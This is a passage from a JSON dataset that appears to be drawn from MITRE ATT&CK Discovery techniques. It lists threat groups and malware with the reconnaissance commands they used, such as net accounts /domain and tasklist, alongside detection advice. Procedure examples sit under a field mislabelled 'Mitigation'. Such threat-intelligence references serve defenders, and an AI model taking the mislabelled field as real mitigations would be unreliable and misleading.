        "description": "Chimera has used the NtdsAudit utility to collect information related to accounts and passwords.[6]"
      },
      {
        "id": "S0488",
        "name": "CrackMapExec",
        "description": "CrackMapExec can discover the password policies applied to the target system.[7]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs collects password policy information with the command net accounts.[8]"
      },
      {
        "id": "S0039",
        "name": "Net",
        "description": "The net accounts and net accounts /domain commands with Net can be used to obtain password policy information.[9]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used net.exe in a script with net accounts /domain to find the password policy of a domain.[10]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors used the net accounts command as part of their advanced reconnaissance.[11]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 can use Get-PassPol to enumerate the domain password policy.[12]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla has used net accounts and net accounts /domain to acquire password policy information.[13]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may attempt to access detailed information about the password policy used within an enterprise network or cloud environment."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Metadata",
        "detects": "Monitor for contextual data about an account that may attempt to access detailed information about the password policy used within an enterprise network or cloud environment."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Peripheral Device Discovery",
    "Code": "T1120",
    "Description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.[1][2] Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
    "Mitigation": [
      {
        "id": "S0045",
        "name": "ADVSTORESHELL",
        "description": "ADVSTORESHELL can list connected devices.[3]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 uses a module to receive a notification every time a USB mass storage device is inserted into a victim.[4]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 has a Bluetooth device harvester, which uses Windows Bluetooth APIs to find information on connected Bluetooth devices. [5]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor has a plugin that collects information about inserted storage devices, modems, and phone devices.[6]"
      },
      {
        "id": "G0135",
        "name": "BackdoorDiplomacy",
        "description": "BackdoorDiplomacy has used an executable to detect removable media, such as USB flash drives.[7]"
      },
      {
        "id": "S0128",
        "name": "BADNEWS",
        "description": "BADNEWS checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message.[8][9]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook can detect USB devices.[10]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "BlackEnergy can gather very specific information about attached USB devices, to include device instance ID and drive geometry.[11]"
      },
      {
        "id": "S0454",
        "name": "Cadelspy",
        "description": "Cadelspy has the ability to steal information about printers and the documents sent to printers.[12]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson has the ability to discover pluggable/removable drives to extract files from.[13][14]"
      },
      {
        "id": "S0538",
        "name": "Crutch",
        "description": "Crutch can monitor for removable drives being plugged into the compromised machine.[15]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can list signed PnP drivers for smartcard readers.[16]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "DustySky can detect connected USB devices.[17]"
      },
      {
        "id": "G0020",
        "name": "Equation",
        "description": "Equation has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.[18]"
      },
      {
        "id": "S0679",
        "name": "Ferocious",
        "description": "Ferocious can run GET.WORKSPACE in Microsoft Excel to check if a mouse is present.[19]"
      },
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy will attempt to detect if a usable smart card is current inserted into a card reader.[20]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "The FunnyDream FilepakMonitor component can detect removable drive insertion.[21]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group tools have contained an application to check performance of USB flash drives. Gamaredon Group has also used malware to scan for removable drives.[22][23]"
      },
      {
        "id": "S1027",
        "name": "Heyoka Backdoor",
        "description": "Heyoka Backdoor can identify removable media attached to victim's machines.[24]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT can map UPnP ports.[25]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete detects the insertion of new devices by listening for the WM_DEVICECHANGE window message.[26]"
      },
      {
        "id": "S1026",
        "name": "Mongall",
        "description": "Mongall can identify removable media attached to compromised hosts.[24]"
      },
      {
        "id": "S0149",
        "name": "MoonWind",
        "description": "MoonWind obtains the number of removable drives from the victim.[27]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub has the ability to monitor removable drives.[28]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT will attempt to detect if the victim system has a camera during the initial infection. njRAT can also detect any removable drives connected to the system.[29][30]"
      },
      {
        "id": "S0644",
        "name": "ObliqueRAT",
        "description": "ObliqueRAT can discover pluggable/removable drives to extract files from.[31]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used tools to identify if a mouse is connected to a targeted system.[32]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors used the fsutil fsinfo drives command as part of their advanced reconnaissance.[33]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors discovered removable disks attached to a system.[34]"
      },
      {
        "id": "S0113",
        "name": "Prikormka",
        "description": "A module in Prikormka collects information on available printers and disk drives.[35]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can identify peripheral devices on targeted systems.[36]"
      },
      {
        "id": "S0686",
        "name": "QuietSieve",
        "description": "QuietSieve can identify and search removable drives for specific file name extensions.[37]"
      },
      {
        "id": "S0481",
        "name": "Ragnar Locker",
        "description": "Ragnar Locker may attempt to connect to removable drives and mapped network drives.[38]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can scan for removable media which may contain documents for collection.[39][40]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can obtain a list of smart card readers attached to the victim.[41][42]"
      },
      {
        "id": "S1089",
        "name": "SharpDisco",
        "description": "SharpDisco has dropped a plugin to monitor external drives to C:\\Users\\Public\\It3.exe.[28]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet enumerates removable drives for infection.[43]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can check for the number of devices plugged into an infected host.[44]"
      },
      {
        "id": "S0098",
        "name": "T9000",
        "description": "T9000 searches through connected drives for removable storage devices.[45]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to identify connected Apple devices.[46]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has searched for attached VGA devices using lspci.[47]"
      },
      {
        "id": "S0647",
        "name": "Turian",
        "description": "Turian can scan for removable media to collect data.[7]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla has used fsutil fsinfo drives to list connected drives.[48]"
      },
      {
        "id": "S0452",
        "name": "USBferry",
        "description": "USBferry can check for connected USB devices.[49]"
      },
      {
        "id": "S0136",
        "name": "USBStealer",
        "description": "USBStealer monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.[50]"
      },
      {
        "id": "S0366",
        "name": "WannaCry",
        "description": "WannaCry contains a thread that will attempt to scan for new attached drives every few seconds. If one is identified, it will encrypt the files on the attached device.[51]"
      },
      {
        "id": "S0612",
        "name": "WastedLocker",
        "description": "WastedLocker can enumerate removable drives prior to the encryption process.[52]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy enumerates information about connected storage devices.[53]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to gather information about attached peripheral devices and components connected to a computer system."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may attempt to gather information about attached peripheral devices and components connected to a computer system."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may attempt to gather information about attached peripheral devices and components connected to a computer system."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Permission Groups Discovery",
    "Code": "T1069",
    "Description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.[1]",
    "Mitigation": [
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 has a tool that can enumerate the permissions associated with Windows groups.[2]"
      },
      {
        "id": "S0335",
        "name": "Carbon",
        "description": "Carbon uses the net group command.[3]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has enumerated all users and roles from a victim's main treasury system.[4]"
      },
      {
        "id": "S0483",
        "name": "IcedID",
        "description": "IcedID has the ability to identify Workgroup membership.[5]"
      },
      {
        "id": "S0233",
        "name": "MURKYTOP",
        "description": "MURKYTOP has the capability to retrieve information about groups.[6]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter gathered the local privileges for the infected host.[7]"
      },
      {
        "id": "S0623",
        "name": "Siloscape",
        "description": "Siloscape checks for Kubernetes node permissions.[8]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used the Get-ManagementRoleAssignment PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.[9]"
      },
      {
        "id": "G0092",
        "name": "TA505",
        "description": "TA505 has used TinyMet to enumerate members of privileged groups.[10] TA505 has also run net group /domain.[11]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot can identify the groups the user on a compromised host belongs to.[12]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for logging, messaging, and other artifacts provided by cloud services."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell."
      },
      {
        "id": "DS0036",
        "dsource": "Group",
        "dcomp": "Group Enumeration",
        "detects": "Monitor for an extracted list of ACLs of available groups and/or their associated settings."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Group Metadata",
        "detects": "Monitor for contextual data about a group which describes group and activity around it."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly constructed processes and/or command-lines for actions that could be taken to gather system and network information. System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1069.001",
        "name": "Local Groups"
      },
      {
        "id": "T1069.002",
        "name": "Domain Groups"
      },
      {
        "id": "T1069.003",
        "name": "Cloud Groups"
      }
    ],
    "Tactic": "\nDiscovery"
  },
  {
    "Title": "Process Discovery",
    "Code": "T1057",
    "Description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.In Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.On network devices, Network Device CLI commands such as show processes can be used to display current running processes.[1][2]",
    "Mitigation": [
      {
        "id": "S0065",
        "name": "4H RAT",
        "description": "4H RAT has the capability to obtain a listing of running processes (including loaded modules).[3]"
      },
      {
        "id": "S0045",
        "name": "ADVSTORESHELL",
        "description": "ADVSTORESHELL can list running processes.[4]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can list the current running processes on the system.[5]"
      },
      {
        "id": "G0138",
        "name": "Andariel",
        "description": "Andariel has used tasklist to enumerate processes and find a specific string.[6]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can enumerate the current process on a compromised host.[7]"
      },
      {
        "id": "G0006",
        "name": "APT1",
        "description": "APT1 gathered a list of running processes on the system using tasklist /v.[8]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.[9]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 has a tool that can list out currently running processes.[10][11]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37's Freenki malware lists running processes using the Microsoft Windows API.[12]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 leveraged Sysmon to understand the processes, services in the organization.[13]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to enumerate loaded modules for a process.[14]."
      },
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth searches for different processes on the system.[15]"
      },
      {
        "id": "S1087",
        "name": "AsyncRAT",
        "description": "AsyncRAT can examine running processes to determine if a debugger is present.[16]"
      },
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon has collected information about running processes.[17]"
      },
      {
        "id": "S0473",
        "name": "Avenger",
        "description": "Avenger has the ability to use Tasklist to identify running processes.[18]"
      },
      {
        "id": "S1053",
        "name": "AvosLocker",
        "description": "AvosLocker has discovered system processes by calling RmGetList.[19]"
      },
      {
        "id": "S0344",
        "name": "Azorult",
        "description": "Azorult can collect a list of running processes by calling CreateToolhelp32Snapshot.[20][21]"
      },
      {
        "id": "S0638",
        "name": "Babuk",
        "description": "Babuk has the ability to check running processes on a targeted system.[22][23][24]"
      },
      {
        "id": "S0414",
        "name": "BabyShark",
        "description": "BabyShark has executed the tasklist command.[25]"
      },
      {
        "id": "S0093",
        "name": "Backdoor.Oldrea",
        "description": "Backdoor.Oldrea collects information about running processes.[26]"
      },
      {
        "id": "S0031",
        "name": "BACKSPACE",
        "description": "BACKSPACE may collect information about running processes.[27]"
      },
      {
        "id": "S0606",
        "name": "Bad Rabbit",
        "description": "Bad Rabbit can enumerate all running processes to compare hashes.[28]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can retrieve a list of running processes from a compromised machine.[29]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot identifies processes and collects the process ids.[30]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can identity the current process on a compromised host.[31]"
      },
      {
        "id": "S0127",
        "name": "BBSRAT",
        "description": "BBSRAT can list running processes.[32]"
      },
      {
        "id": "S0017",
        "name": "BISCUIT",
        "description": "BISCUIT has a command to enumerate running processes and identify their owners.[33]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal can obtain a list of running processes on the victim’s machine.[34][35][36]"
      },
      {
        "id": "S0069",
        "name": "BLACKCOFFEE",
        "description": "BLACKCOFFEE has the capability to discover processes.[37]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "BlackEnergy has gathered a process list by using Tasklist.exe.[38][39][40]"
      },
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT can collect process filenames and SID authority level.[41]"
      },
      {
        "id": "S0486",
        "name": "Bonadan",
        "description": "Bonadan can use the ps command to discover other cryptocurrency miners active on the system.[42]"
      },
      {
        "id": "S0252",
        "name": "Brave Prince",
        "description": "Brave Prince lists the running processes.[43]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 can enumerate all processes and locate specific process IDs (PIDs).[44]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can identify processes associated with analytical tools.[45][46][47]"
      },
      {
        "id": "S0482",
        "name": "Bundlore",
        "description": "Bundlore has used the ps command to list processes.[48]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors used the tasklist /s command as well as taskmanager to obtain a list of running processes.[49]"
      },
      {
        "id": "S0693",
        "name": "CaddyWiper",
        "description": "CaddyWiper can obtain a list of current processes.[50]"
      },
      {
        "id": "S0351",
        "name": "Cannon",
        "description": "Cannon can obtain a list of processes running on the system.[51][52]"
      },
      {
        "id": "S0030",
        "name": "Carbanak",
        "description": "Carbanak lists running processes.[53]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp has collected a list of running processes.[54]"
      },
      {
        "id": "S0335",
        "name": "Carbon",
        "description": "Carbon can list the processes on the victim’s machine.[55]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT contains watchdog functionality that ensures its process is always running, else spawns a new instance.[56]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell can gather a list of processes running on the machine.[57]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower has the ability to list running processes through the use of tasklist.[58]"
      },
      {
        "id": "S0144",
        "name": "ChChes",
        "description": "ChChes collects its process identifier (PID) on the victim.[59]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used tasklist to enumerate processes.[60]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can enumerate processes on a targeted system.[61]"
      },
      {
        "id": "S0611",
        "name": "Clop",
        "description": "Clop can enumerate all processes on the victim's machine.[62]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike's Beacon payload can collect information on process details.[63][64][65]"
      },
      {
        "id": "S0244",
        "name": "Comnie",
        "description": "Comnie uses the tasklist to view running processes on the victim’s machine.[66]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti can enumerate through all open processes to search for any that have the string \"sql\" in their process name.[67]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson contains a command to list processes.[68][69][70]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba can enumerate processes running on a victim's machine.[71]"
      },
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink can enumerate the process it is currently running under.[72]"
      },
      {
        "id": "S0497",
        "name": "Dacls",
        "description": "Dacls can collect data on running and parent processes.[73]"
      },
      {
        "id": "S0334",
        "name": "DarkComet",
        "description": "DarkComet can list active processes running on the victim’s machine.[74]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel malware can collect a list of running processes on a system.[75]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla can enumerate a list of running processes on a compromised system.[76]"
      },
      {
        "id": "G0009",
        "name": "Deep Panda",
        "description": "Deep Panda uses the Microsoft Tasklist utility to list processes running on systems.[77]"
      },
      {
        "id": "S0021",
        "name": "Derusbi",
        "description": "Derusbi collects current and parent process IDs.[78][79]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol has used CreateToolhelp32Snapshot, Process32First, and Process32Next API calls to enumerate the running processes in the system.[80]"
      },
      {
        "id": "S0600",
        "name": "Doki",
        "description": "Doki has searched for the current process’s PID.[81]"
      },
      {
        "id": "S0695",
        "name": "Donut",
        "description": "Donut includes subprojects that enumerate and identify information about Process Injection candidates.[82]"
      },
      {
        "id": "S0472",
        "name": "down_new",
        "description": "down_new has the ability to list running processes on a compromised host.[18]"
      },
      {
        "id": "S0694",
        "name": "DRATzarus",
        "description": "DRATzarus can enumerate and examine running processes to determine if a debugger is present.[83]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack’s dropper can list all running processes.[84][85]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "The discovery modules used with Duqu can collect information on process details.[86]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "DustySky collects information about running processes from victims.[87][88]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca has used Tasklist to obtain information from a compromised host.[89]"
      },
      {
        "id": "S0605",
        "name": "EKANS",
        "description": "EKANS looks for processes from a hard-coded list.[90][91][92]"
      },
      {
        "id": "S0081",
        "name": "Elise",
        "description": "Elise enumerates processes via the tasklist command.[93]"
      },
      {
        "id": "S0064",
        "name": "ELMER",
        "description": "ELMER is capable of performing process listings.[94]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has been observed enumerating local processes.[95]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can find information about processes running on local and remote systems.[96][97]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic uses the tasklist /v command to obtain a list of processes.[98][99]"
      },
      {
        "id": "S0396",
        "name": "EvilBunny",
        "description": "EvilBunny has used EnumProcesses() to identify how many process are running in the environment.[100]"
      },
      {
        "id": "S0512",
        "name": "FatDuke",
        "description": "FatDuke can list running processes on the localhost.[101]"
      },
      {
        "id": "S0267",
        "name": "FELIXROOT",
        "description": "FELIXROOT collects a list of running processes.[102]"
      },
      {
        "id": "S0355",
        "name": "Final1stspy",
        "description": "Final1stspy obtains a list of running processes.[103]"
      },
      {
        "id": "S0182",
        "name": "FinFisher",
        "description": "FinFisher checks its parent process for indications that it is running in a sandbox setup.[104][105]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro has been used to run the tasklist command on a compromised system.[106]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb's loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server's Microsoft.IdentityServer.ServiceHost.exe process.[107]"
      },
      {
        "id": "S0503",
        "name": "FrameworkPOS",
        "description": "FrameworkPOS can enumerate and exclude selected processes on a compromised host to speed execution of memory scraping.[108]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors used Empire to obtain a list of all running processes.[97]"
      },
      {
        "id": "S0277",
        "name": "FruitFly",
        "description": "FruitFly has the ability to list processes on the system.[109]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream has the ability to discover processes, including Bka.exe and BkavUtil.exe.[110]"
      },
      {
        "id": "C0007",
        "name": "FunnyDream",
        "description": "During FunnyDream, the threat actors used Tasklist on targeted systems.[110]"
      },
      {
        "id": "S0410",
        "name": "Fysbis",
        "description": "Fysbis can collect information about running processes.[111]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has used tools to enumerate processes on target hosts including Process Explorer.[112][113]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can enumerate running processes.[114]"
      },
      {
        "id": "S0049",
        "name": "GeminiDuke",
        "description": "GeminiDuke collects information on running processes and environment variables from the victim.[115]"
      },
      {
        "id": "S0460",
        "name": "Get2",
        "description": "Get2 has the ability to identify running processes on an infected host.[116]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT has the capability to list processes.[117]"
      },
      {
        "id": "S0249",
        "name": "Gold Dragon",
        "description": "Gold Dragon checks the running processes on the victim’s machine.[43]"
      },
      {
        "id": "S0477",
        "name": "Goopy",
        "description": "Goopy has checked for the Google Updater process to ensure Goopy was loaded properly.[118]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can identify installed security tools based on process names.[119]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT lists the running processes on the system.[120]"
      },
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM has used tasklist to enumerate processes.[121]"
      },
      {
        "id": "S0151",
        "name": "HALFBAKED",
        "description": "HALFBAKED can obtain information about running processes on the victim.[122]"
      },
      {
        "id": "S0617",
        "name": "HELLOKITTY",
        "description": "HELLOKITTY can search for specific processes to terminate.[123]"
      },
      {
        "id": "S0170",
        "name": "Helminth",
        "description": "Helminth has used Tasklist to get information on processes.[9]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has enumerated processes on targeted systems.[124]"
      },
      {
        "id": "S1027",
        "name": "Heyoka Backdoor",
        "description": "Heyoka Backdoor can gather process information.[125]"
      },
      {
        "id": "G0126",
        "name": "Higaisa",
        "description": "Higaisa’s shellcode attempted to find the process ID of the current process.[126]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has the ability to list running processes on the infected host.[127]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a backdoor through which remote attackers can monitor processes.[128][129]"
      },
      {
        "id": "S0278",
        "name": "iKitten",
        "description": "iKitten lists the current processes running.[109]"
      },
      {
        "id": "S0434",
        "name": "Imminent Monitor",
        "description": "Imminent Monitor has a \"Process Watcher\" feature to monitor processes in case the client ever crashes or gets closed.[130]"
      },
      {
        "id": "G0100",
        "name": "Inception",
        "description": "Inception has used a reconnaissance module to identify active processes and other associated loaded modules.[131]"
      },
      {
        "id": "S1072",
        "name": "Industroyer2",
        "description": "Industroyer2 has the ability to cyclically enumerate running processes such as PServiceControl.exe, PService_PDD.exe, and other targets supplied through a hardcoded configuration.[132]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can obtain a list of running processes.[133][134]"
      },
      {
        "id": "S0581",
        "name": "IronNetInjector",
        "description": "IronNetInjector can identify processes via C# methods such as GetProcessesByName and running Tasklist with the Python os.popen function.[135]"
      },
      {
        "id": "S0015",
        "name": "Ixeshe",
        "description": "Ixeshe can list running processes.[136]"
      },
      {
        "id": "S0528",
        "name": "Javali",
        "description": "Javali can monitor processes for open browsers and custom banking applications.[137]"
      },
      {
        "id": "S0044",
        "name": "JHUHUGIT",
        "description": "JHUHUGIT obtains a list of running processes on the victim.[138][139]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "JPIN can list running processes.[140]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT can query and kill system processes.[141]"
      },
      {
        "id": "S0088",
        "name": "Kasidet",
        "description": "Kasidet has the ability to search for a given process name in processes currently running in the system.[142]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar obtains a list of running processes through WMI querying and the ps command.[143]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang performs process discovery using tasklist commands.[144][145]"
      },
      {
        "id": "S0271",
        "name": "KEYMARBLE",
        "description": "KEYMARBLE can obtain a list of running processes on the system.[146]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk has called GetCurrentProcess.[147]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky can gather a list of all processes running on a victim's machine.[148]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing has used ps to list processes.[149]"
      },
      {
        "id": "S0162",
        "name": "Komplex",
        "description": "The OsInfo function in Komplex collects a running process list.[150]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI has used the command cmd /c tasklist to get a snapshot of the current processes on the target machine.[151][152]"
      },
      {
        "id": "S1075",
        "name": "KOPILUWAK",
        "description": "KOPILUWAK can enumerate current running processes on the targeted machine.[153]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs collects a list of running services with the command tasklist /v.[154]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by Lazarus Group also gathers process times.[155][156][157][158][73][159]"
      },
      {
        "id": "S0211",
        "name": "Linfo",
        "description": "Linfo creates a backdoor through which remote attackers can retrieve a list of running processes.[160]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar has a plugin designed to obtain a list of processes.[161][162]"
      },
      {
        "id": "S0582",
        "name": "LookBack",
        "description": "LookBack can list running processes.[163]"
      },
      {
        "id": "S0451",
        "name": "LoudMiner",
        "description": "LoudMiner used the ps command to monitor the running processes on the system.[164]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can identify the process that owns remote connections.[165]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete has a component to check for running processes to look for web browsers.[166]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa can enumerate running processes.[167]"
      },
      {
        "id": "S1048",
        "name": "macOS.OSAMiner",
        "description": "macOS.OSAMiner has used ps ax | grep <name> | grep -v grep | ... and ps ax | grep -E... to conduct process discovery.[168]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can enumerate running processes on a machine.[169]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound malware can list running processes.[170]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
